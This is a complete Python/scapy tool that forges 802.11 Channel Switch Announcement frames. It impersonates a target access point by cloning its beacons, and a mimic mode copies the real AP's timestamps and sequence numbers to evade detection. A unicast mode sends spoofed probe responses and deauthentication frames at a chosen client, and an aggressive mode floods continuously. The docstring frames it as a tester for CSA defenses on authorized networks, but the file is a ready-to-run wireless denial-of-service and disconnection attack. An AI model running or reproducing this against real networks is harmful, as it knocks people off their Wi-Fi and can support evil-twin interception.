#!/usr/bin/env python3
"""802.11 CSA (Channel Switch Announcement) frame injector.

Impersonates the AP of a given SSID and injects frames carrying a CSA element.

  broadcast : clones a real beacon and splices in a CSA element (targets every client)
  unicast   : injects a CSA-bearing probe response plus deauth at one specific STA

Intended for validating CSA detection/mitigation logic. Only use it on networks
you own or are explicitly authorized to test.

Examples:
  sudo ./csa_packet.py -i mon0 -c 7 -v KT_GiGA_6ED8 --aggressive
  sudo ./csa_packet.py -i mon0 -c 7 -v KT_GiGA_6ED8 -d unicast -s AA:BB:CC:DD:EE:FF --aggressive
  sudo ./csa_packet.py -i mon0 -c 7 -v KT_GiGA_6ED8 --aggressive --duration 30 --log-file run.log
"""

from __future__ import annotations

import argparse
import logging
import os
import re
import signal
import subprocess
import sys
import threading
import time
from collections import defaultdict
from dataclasses import dataclass
from pathlib import Path

from scapy.all import (
    AsyncSniffer,
    Dot11,
    Dot11Beacon,
    Dot11Deauth,
    Dot11Elt,
    Dot11EltDSSSet,
    Dot11ProbeResp,
    Packet,
    RadioTap,
    conf,
    sendp,
    wrpcap,
)

try:  # scapy 2.4.3+
    from scapy.layers.dot11 import Dot11EltCSA
except ImportError:  # pragma: no cover - 구버전 scapy 대비
    Dot11EltCSA = None

BROADCAST = "ff:ff:ff:ff:ff:ff"
CSA_ELEMENT_ID = 37
ARPHRD_IEEE80211_RADIOTAP = 803  # /sys/class/net/<if>/type
IFF_UP = 0x1  # /sys/class/net/<if>/flags
MAC_RE = re.compile(r"^([0-9A-Fa-f]{2}[:-]){5}[0-9A-Fa-f]{2}$")

log = logging.getLogger("csa")


# --------------------------------------------------------------------------- #
# 설정
# --------------------------------------------------------------------------- #

@dataclass(frozen=True)
class Config:
    interface: str
    channel: int
    ssid: str
    casting: str
    station: str | None
    aggressive: bool
    new_channel: int
    csa_mode: int
    csa_count: int
    count: int
    interval: float
    burst: int
    duration: float | None
    discover_timeout: float
    ignore_case: bool
    pcap: str | None
    mimic: bool
    interval_opt: float | None


@dataclass
class Target:
    bssid: str
    beacon: Packet
    rssi: int | None = None
    base_timestamp: int = 0        # 캡처 시점의 AP TSF (us)
    base_seq: int = 0              # 캡처한 beacon의 sequence number
    beacon_interval_tu: int = 100  # TU (1 TU = 1024us)
    captured_at: float = 0.0       # time.monotonic()

    @property
    def beacon_interval_sec(self) -> float:
        return self.beacon_interval_tu * 1024 / 1_000_000


# --------------------------------------------------------------------------- #
# 통계
# --------------------------------------------------------------------------- #

class Stats:
    def __init__(self) -> None:
        self._lock = threading.Lock()
        self._counts: dict[str, int] = defaultdict(int)

    def add(self, label: str, n: int) -> None:
        with self._lock:
            self._counts[label] += n

    def snapshot(self) -> dict[str, int]:
        with self._lock:
            return dict(self._counts)

    def total(self) -> int:
        with self._lock:
            return sum(self._counts.values())


# --------------------------------------------------------------------------- #
# 프레임 생성
# --------------------------------------------------------------------------- #

def csa_element(mode: int, new_channel: int, count: int) -> Packet:
    """CSA IE 생성. scapy에 전용 레이어가 없으면 raw로 대체한다."""
    if Dot11EltCSA is not None:
        return Dot11EltCSA(mode=mode, new_channel=new_channel, channel_switch_count=count)
    return Dot11Elt(ID=CSA_ELEMENT_ID, len=3, info=bytes([mode, new_channel, count]))


def ssid_of(pkt: Packet) -> str | None:
    elt = pkt.getlayer(Dot11Elt)
    while elt is not None:
        if elt.ID == 0:
            return elt.info.decode("utf-8", errors="replace")
        elt = elt.payload.getlayer(Dot11Elt)
    return None


def rssi_of(pkt: Packet) -> int | None:
    try:
        return int(pkt[RadioTap].dBm_AntSignal)
    except Exception:
        return None


def split_elements(raw: bytes) -> list[tuple[int, bytes]]:
    """IE 체인 raw 바이트를 (ID, value) 목록으로 쪼갠다.

    scapy가 HT Capabilities/RSN 등을 구조화된 서브클래스로 파싱하기 때문에
    레이어 단위로 복제하면 필드가 어긋난다. 바이트로 다루는 편이 안전하다.
    """
    elements: list[tuple[int, bytes]] = []
    offset = 0
    while offset + 2 <= len(raw):
        eid, length = raw[offset], raw[offset + 1]
        value = raw[offset + 2 : offset + 2 + length]
        if len(value) < length:  # 잘린 프레임
            log.debug("truncated IE chain at ID=%d", eid)
            break
        elements.append((eid, value))
        offset += 2 + length
    return elements


def radiotap_header(cfg: Config) -> Packet:
    """mimic 모드에서는 mac80211이 시퀀스 번호를 덮어쓰지 않도록 NOSEQ를 요청한다."""
    if cfg.mimic:
        return RadioTap(present="TXFlags", TXFlags="NOSEQ")
    return RadioTap()


def build_csa_beacon(target: Target, cfg: Config,
                     timestamp: int | None = None, seq: int | None = None) -> Packet:
    """원본 beacon의 IE 체인을 바이트 그대로 복제하고 CSA IE를 ID 순서에 맞게 끼워 넣는다.

    timestamp/seq를 주면 진짜 AP의 TSF와 시퀀스를 이어받은 것처럼 채운다.
    """
    src = target.beacon[Dot11Beacon]
    dot11 = Dot11(type=0, subtype=8, addr1=BROADCAST, addr2=target.bssid, addr3=target.bssid)
    if seq is not None:
        dot11.SC = (seq % 4096) << 4
    beacon = Dot11Beacon(beacon_interval=src.beacon_interval, cap=src.cap)
    if timestamp is not None:
        beacon.timestamp = timestamp & 0xFFFFFFFFFFFFFFFF
    frame = radiotap_header(cfg) / dot11 / beacon

    csa = bytes(csa_element(cfg.csa_mode, cfg.new_channel, cfg.csa_count))
    payload, inserted = b"", False
    for eid, value in split_elements(bytes(src.payload)):
        if not inserted and eid > CSA_ELEMENT_ID:
            payload += csa
            inserted = True
        payload += bytes([eid, len(value)]) + value
    if not inserted:
        payload += csa

    return frame / Dot11Elt(payload)


def build_csa_probe_resp(target: Target, cfg: Config) -> Packet:
    dot11 = Dot11(type=0, subtype=5, addr1=cfg.station, addr2=target.bssid, addr3=target.bssid)
    return (
        radiotap_header(cfg)
        / dot11
        / Dot11ProbeResp(cap=0x1111)
        / Dot11Elt(ID=0, info=cfg.ssid.encode())
        / Dot11EltDSSSet(channel=cfg.channel)
        / csa_element(cfg.csa_mode, cfg.new_channel, cfg.csa_count)
    )


def build_deauth(target: Target, cfg: Config) -> Packet:
    dot11 = Dot11(type=0, subtype=12, addr1=cfg.station, addr2=target.bssid, addr3=target.bssid)
    return radiotap_header(cfg) / dot11 / Dot11Deauth(reason=7)


# --------------------------------------------------------------------------- #
# 주입기
# --------------------------------------------------------------------------- #

class CSAInjector:
    def __init__(self, cfg: Config, stop: threading.Event) -> None:
        self.cfg = cfg
        self.stop = stop
        self.stats = Stats()
        self.seen_ssids: dict[str, str] = {}  # SSID -> 최초 관측 BSSID

    # -- 탐색 ---------------------------------------------------------------
    def _matches(self, ssid: str | None) -> bool:
        if ssid is None:
            return False
        if self.cfg.ignore_case:
            return ssid.casefold() == self.cfg.ssid.casefold()
        return ssid == self.cfg.ssid

    def discover(self) -> list[Target]:
        targets: dict[str, Target] = {}

        def on_packet(pkt: Packet) -> None:
            if not pkt.haslayer(Dot11Beacon):
                return
            ssid = ssid_of(pkt)
            bssid = pkt[Dot11].addr3
            if ssid is not None and bssid is not None:
                self.seen_ssids.setdefault(ssid, bssid)
            if not self._matches(ssid):
                return
            if bssid is None or bssid in targets:
                return
            beacon_layer = pkt[Dot11Beacon]
            targets[bssid] = Target(
                bssid=bssid,
                beacon=pkt,
                rssi=rssi_of(pkt),
                base_timestamp=int(beacon_layer.timestamp or 0),
                base_seq=(pkt[Dot11].SC or 0) >> 4,
                beacon_interval_tu=int(beacon_layer.beacon_interval or 100),
                captured_at=time.monotonic(),
            )
            log.info("found AP  bssid=%s  rssi=%s dBm", bssid, targets[bssid].rssi)

        log.info("collecting beacons for %.1fs (ssid=%r)", self.cfg.discover_timeout, self.cfg.ssid)
        sniffer = AsyncSniffer(iface=self.cfg.interface, prn=on_packet, store=False)
        try:
            sniffer.start()
            self.stop.wait(self.cfg.discover_timeout)
            sniffer.stop()
        except OSError as exc:
            raise SystemExit(f"cannot capture on {self.cfg.interface}: {exc}") from exc
        return list(targets.values())

    # -- 전송 ---------------------------------------------------------------
    def _sender(self, label: str, frames: list[Packet]) -> None:
        cfg = self.cfg
        per_round = len(frames) * (cfg.burst if cfg.aggressive else cfg.count)
        log.debug("[%s] sender thread started (frames=%d)", label, len(frames))
        try:
            if not cfg.aggressive:
                sendp(frames, iface=cfg.interface, count=cfg.count,
                      inter=cfg.interval, verbose=False)
                self.stats.add(label, per_round)
                return
            while not self.stop.is_set():
                sendp(frames, iface=cfg.interface, count=cfg.burst,
                      inter=cfg.interval, verbose=False)
                self.stats.add(label, per_round)
        except OSError as exc:
            log.error("[%s] send failed: %s", label, exc)
            self.stop.set()
        finally:
            log.debug("[%s] sender thread stopped", label)

    def _mimic_beacon_sender(self, target: Target) -> None:
        """진짜 AP의 TSF/시퀀스를 이어받아 beacon 주기에 맞춰 한 장씩 내보낸다."""
        cfg = self.cfg
        label = "beacon-csa"
        interval = cfg.interval_opt if cfg.interval_opt is not None else target.beacon_interval_sec
        seq, sent = target.base_seq, 0
        log.debug("[%s] mimic sender started for %s (interval=%.4fs)", label, target.bssid, interval)
        try:
            while not self.stop.is_set():
                elapsed_us = int((time.monotonic() - target.captured_at) * 1_000_000)
                seq += 1
                frame = build_csa_beacon(target, cfg,
                                         timestamp=target.base_timestamp + elapsed_us,
                                         seq=seq)
                sendp(frame, iface=cfg.interface, verbose=False)
                sent += 1
                self.stats.add(label, 1)
                if not cfg.aggressive and sent >= cfg.count:
                    return
                if self.stop.wait(interval):
                    return
        except OSError as exc:
            log.error("[%s] send failed: %s", label, exc)
            self.stop.set()
        finally:
            log.debug("[%s] mimic sender stopped", label)

    def run(self, targets: list[Target]) -> int:
        cfg = self.cfg
        threads: list[threading.Thread] = []
        preview: list[Packet] = []

        if cfg.casting == "broadcast" and cfg.mimic:
            for target in targets:
                preview.append(build_csa_beacon(target, cfg,
                                                timestamp=target.base_timestamp,
                                                seq=target.base_seq + 1))
                threads.append(threading.Thread(target=self._mimic_beacon_sender,
                                                args=(target,), name="beacon-csa", daemon=True))
                log.info("mimic  bssid=%s  tsf=%d  seq=%d  beacon_interval=%.1fms",
                         target.bssid, target.base_timestamp, target.base_seq,
                         target.beacon_interval_sec * 1000)
        else:
            jobs: list[tuple[str, list[Packet]]] = []
            if cfg.casting == "broadcast":
                jobs.append(("beacon-csa", [build_csa_beacon(t, cfg) for t in targets]))
            else:
                jobs.append(("probe-csa", [build_csa_probe_resp(t, cfg) for t in targets]))
                jobs.append(("deauth", [build_deauth(t, cfg) for t in targets]))
            preview = [f for _, group in jobs for f in group]
            threads = [
                threading.Thread(target=self._sender, args=(label, frames),
                                 name=label, daemon=True)
                for label, frames in jobs
            ]

        if cfg.pcap:
            wrpcap(cfg.pcap, preview)
            log.info("wrote %d frame(s) to %s", len(preview), cfg.pcap)

        log.info("=== injection started === mode=%s%s  targets=%d  new_channel=%d  aggressive=%s",
                 cfg.casting, " +mimic" if cfg.mimic else "", len(targets),
                 cfg.new_channel, cfg.aggressive)
        started = time.monotonic()
        for t in threads:
            t.start()

        try:
            while any(t.is_alive() for t in threads):
                if self.stop.wait(2.0):
                    break
                elapsed = time.monotonic() - started
                if cfg.duration and elapsed >= cfg.duration:
                    log.info("duration limit reached (%.0fs), stopping", cfg.duration)
                    self.stop.set()
                    break
                total = self.stats.total()
                log.info("running  %.0fs  sent=%d  (%.0f pkt/s)",
                         elapsed, total, total / max(elapsed, 1e-9))
        finally:
            self.stop.set()
            for t in threads:
                t.join(timeout=3.0)
            elapsed = time.monotonic() - started
            counts = self.stats.snapshot()
            log.info("=== injection stopped === elapsed %.1fs", elapsed)
            for label, n in sorted(counts.items()):
                log.info("  %-12s %8d frames", label, n)
            log.info("  %-12s %8d frames", "total", sum(counts.values()))
        return 0


# --------------------------------------------------------------------------- #
# 환경 확인
# --------------------------------------------------------------------------- #

def ensure_root() -> None:
    if os.geteuid() != 0:
        raise SystemExit("root privileges required (run with sudo)")


def ensure_monitor(iface: str) -> None:
    sysfs = Path(f"/sys/class/net/{iface}")
    if not sysfs.exists():
        raise SystemExit(f"interface not found: {iface}")

    if int((sysfs / "type").read_text().strip()) != ARPHRD_IEEE80211_RADIOTAP:
        raise SystemExit(
            f"{iface} is not in monitor mode\n"
            f"  sudo ip link set {iface} down\n"
            f"  sudo iw dev {iface} set type monitor\n"
            f"  sudo ip link set {iface} up"
        )

    # iw 로 채널을 바꾸는 건 down 상태에서도 성공해버려서, 여기서 걸러야
    # 나중에 소켓 열 때 ENETDOWN 트레이스백이 뜨지 않는다.
    flags = int((sysfs / "flags").read_text().strip(), 16)
    if not flags & IFF_UP:
        raise SystemExit(f"{iface} is down\n  sudo ip link set {iface} up")


def set_channel(iface: str, channel: int) -> None:
    log.info("setting channel: %s -> ch.%d", iface, channel)
    result = subprocess.run(
        ["iw", "dev", iface, "set", "channel", str(channel)],
        capture_output=True, text=True,
    )
    if result.returncode != 0:
        raise SystemExit(f"failed to set channel: {result.stderr.strip() or result.stdout.strip()}")


# --------------------------------------------------------------------------- #
# CLI
# --------------------------------------------------------------------------- #

class ColorFormatter(logging.Formatter):
    COLORS = {
        logging.DEBUG: "\x1b[36m",
        logging.INFO: "\x1b[32m",
        logging.WARNING: "\x1b[33m",
        logging.ERROR: "\x1b[31m",
        logging.CRITICAL: "\x1b[1;31m",
    }

    def format(self, record: logging.LogRecord) -> str:
        text = super().format(record)
        color = self.COLORS.get(record.levelno)
        return f"{color}{text}\x1b[0m" if color else text


def setup_logging(verbose: bool, log_file: str | None, no_color: bool) -> None:
    level = logging.DEBUG if verbose else logging.INFO
    fmt, datefmt = "%(asctime)s %(levelname)-7s %(message)s", "%H:%M:%S"

    stream = logging.StreamHandler(sys.stderr)
    use_color = not no_color and sys.stderr.isatty()
    stream.setFormatter((ColorFormatter if use_color else logging.Formatter)(fmt, datefmt))

    handlers: list[logging.Handler] = [stream]
    if log_file:
        file_handler = logging.FileHandler(log_file, encoding="utf-8")
        file_handler.setFormatter(logging.Formatter(fmt, datefmt))
        handlers.append(file_handler)

    logging.basicConfig(level=level, handlers=handlers, force=True)


def mac_address(value: str) -> str:
    if not MAC_RE.match(value):
        raise argparse.ArgumentTypeError(f"not a MAC address: {value!r}")
    return value.lower().replace("-", ":")


def wifi_channel(value: str) -> int:
    ch = int(value)
    if not (1 <= ch <= 14 or 32 <= ch <= 177):
        raise argparse.ArgumentTypeError(f"not a valid channel: {ch}")
    return ch


def parse_args(argv: list[str] | None = None) -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="802.11 CSA frame injector (for validating CSA defenses)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__.split("Examples:")[-1],
    )
    p.add_argument("-i", "--interface", required=True, help="monitor mode interface (e.g. mon0)")
    p.add_argument("-c", "--channel", required=True, type=wifi_channel, help="channel the target AP is on")
    p.add_argument("-v", "--ssid", required=True, help="target SSID")
    p.add_argument("-d", "--casting", choices=("broadcast", "unicast"), default="broadcast",
                   help="broadcast=beacon, unicast=probe response + deauth (default: broadcast)")
    p.add_argument("-s", "--station", type=mac_address, help="target STA MAC (unicast mode)")
    p.add_argument("--ignore-case", action="store_true", help="match SSID case-insensitively")

    p.add_argument("--mimic", action="store_true",
                   help="copy the AP's TSF timestamp and sequence numbers, and pace injection at "
                        "the real beacon interval (broadcast mode only)")
    p.add_argument("--aggressive", action="store_true",
                   help="inject continuously until stopped (otherwise send --count rounds)")
    p.add_argument("--new-channel", type=int,
                   help="channel advertised by the CSA element (default: broadcast=100, unicast=253)")
    p.add_argument("--csa-mode", type=int, default=0, choices=(0, 1),
                   help="CSA mode field; 1 tells clients to stop TX until the switch (default: 0)")
    p.add_argument("--csa-count", type=int, default=1, help="CSA count field (default: 1)")

    p.add_argument("--count", type=int, default=6, help="rounds to send in non-aggressive mode (default: 6)")
    p.add_argument("--interval", type=float,
                   help="seconds between frames (default: 0.0004 aggressive, 0 otherwise)")
    p.add_argument("--burst", type=int, default=25,
                   help="frames per send call in aggressive mode (default: 25)")
    p.add_argument("--duration", type=float, help="stop automatically after N seconds")
    p.add_argument("--discover-timeout", type=float, default=5.0,
                   help="seconds spent collecting beacons (default: 5)")

    p.add_argument("--pcap", metavar="FILE",
                   help="dump the crafted frames to a pcap file (one of each, for inspection)")
    p.add_argument("--log-file", help="also write logs to this file")
    p.add_argument("--no-color", action="store_true", help="disable colored output")
    p.add_argument("-V", "--verbose", action="store_true", help="debug logging")

    args = p.parse_args(argv)
    if args.casting == "unicast" and not args.station:
        p.error("unicast mode requires -s/--station")
    return args


def build_config(args: argparse.Namespace) -> Config:
    default_new_channel = 100 if args.casting == "broadcast" else 253
    return Config(
        interface=args.interface,
        channel=args.channel,
        ssid=args.ssid,
        casting=args.casting,
        station=args.station,
        aggressive=args.aggressive,
        new_channel=args.new_channel if args.new_channel is not None else default_new_channel,
        csa_mode=args.csa_mode,
        csa_count=args.csa_count,
        count=args.count,
        interval=args.interval if args.interval is not None else (0.0004 if args.aggressive else 0),
        burst=args.burst,
        duration=args.duration,
        discover_timeout=args.discover_timeout,
        ignore_case=args.ignore_case,
        pcap=args.pcap,
        mimic=args.mimic,
        interval_opt=args.interval,
    )


def main(argv: list[str] | None = None) -> int:
    args = parse_args(argv)
    setup_logging(args.verbose, args.log_file, args.no_color)
    conf.verb = 0

    ensure_root()
    ensure_monitor(args.interface)

    cfg = build_config(args)
    stop = threading.Event()

    def on_signal(signum: int, _frame: object) -> None:
        log.warning("%s received, shutting down", signal.Signals(signum).name)
        stop.set()

    for sig in (signal.SIGINT, signal.SIGTERM):
        signal.signal(sig, on_signal)

    log.info("interface=%s  channel=%d  ssid=%r  mode=%s",
             cfg.interface, cfg.channel, cfg.ssid, cfg.casting)
    if cfg.station:
        log.info("target station=%s", cfg.station)

    set_channel(cfg.interface, cfg.channel)

    injector = CSAInjector(cfg, stop)
    targets = injector.discover()
    if not targets:
        log.error("no AP found with ssid %r", cfg.ssid)
        if injector.seen_ssids:
            log.error("%d SSID(s) seen on ch.%d:", len(injector.seen_ssids), cfg.channel)
            for name, bssid in sorted(injector.seen_ssids.items()):
                marker = "  <-- differs only in case" if name.casefold() == cfg.ssid.casefold() else ""
                log.error("  %-32s %s%s", name or "<hidden>", bssid, marker)
            log.error("copy the exact name above, or pass --ignore-case")
        else:
            log.error("no beacons at all, check channel (%d) and monitor mode", cfg.channel)
        return 1
    if stop.is_set():
        log.info("interrupted during discovery")
        return 130

    return injector.run(targets)


if __name__ == "__main__":
    sys.exit(main())